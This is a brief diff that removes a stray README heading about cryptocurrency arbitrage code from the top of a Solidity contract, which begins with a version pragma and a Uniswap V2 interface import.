@@ -1,5 +1,3 @@
-# Codigo-Arbitraje
-Codigo para Arbitraje de Criptomonedas
 pragma solidity ^0.6.6;
 // Import Libraries Migrator/Exchange/Factory
 import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol";
